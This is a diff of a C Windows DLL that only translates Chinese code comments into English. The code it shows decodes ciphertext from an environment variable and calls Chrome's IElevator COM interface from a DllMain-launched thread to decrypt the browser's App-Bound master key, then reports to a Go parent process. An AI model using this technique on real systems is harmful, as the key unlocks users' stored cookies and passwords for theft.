@@ -11,7 +11,7 @@ typedef HRESULT(STDMETHODCALLTYPE *DecryptDataFn)(IUnknown *, BSTR, BSTR *, DWOR
 
 static HMODULE g_module;
 
-// read_env 读取宽字符环境变量
+// read_env reads a wide-character environment variable.
 static wchar_t *read_env(const wchar_t *name) {
     DWORD size = GetEnvironmentVariableW(name, NULL, 0);
     if (size == 0) {
@@ -28,7 +28,7 @@ static wchar_t *read_env(const wchar_t *name) {
     return value;
 }
 
-// decode_base64 解码环境变量中的密文
+// decode_base64 decodes base64 ciphertext from an environment variable.
 static BOOL decode_base64(const wchar_t *input, BYTE **output, DWORD *output_size) {
     DWORD size = 0;
     if (!CryptStringToBinaryW(input, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL) || size == 0) {
@@ -46,7 +46,7 @@ static BOOL decode_base64(const wchar_t *input, BYTE **output, DWORD *output_siz
     *output_size = size;
     return TRUE;
 }
-// write_output 写出成功结果或错误信息
+// write_output writes success results or error messages.
 static void write_output(const wchar_t *path, const BYTE *data, DWORD size) {
     HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (file == INVALID_HANDLE_VALUE) {
@@ -57,12 +57,12 @@ static void write_output(const wchar_t *path, const BYTE *data, DWORD size) {
     CloseHandle(file);
 }
 
-// write_error 写出短错误码
+// write_error writes a short error code.
 static void write_error(const wchar_t *path, const char *message) {
     write_output(path, (const BYTE *)message, (DWORD)lstrlenA(message));
 }
 
-// call_decrypt 调用 Chrome IElevator 解开 App-Bound 主密钥
+// call_decrypt invokes Chrome IElevator to decrypt the App-Bound master key.
 static HRESULT call_decrypt(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD plaintext_size) {
     const IID clsid_chrome = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
     const IID iid_chrome_v2 = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};
@@ -110,7 +110,7 @@ static HRESULT call_decrypt(const BYTE *ciphertext, DWORD ciphertext_size, BYTE 
     return S_OK;
 }
 
-// worker 解密后通知 Go 父进程
+// worker decrypts the key and notifies the Go parent process.
 static DWORD WINAPI worker(LPVOID parameter) {
     (void)parameter;
     wchar_t *input_env = read_env(ABE_INPUT_ENV);
@@ -154,7 +154,7 @@ done:
     return 0;
 }
 
-// DllMain 启动独立工作线程
+// DllMain starts an independent worker thread.
 BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
     (void)reserved;
     if (reason == DLL_PROCESS_ATTACH) {
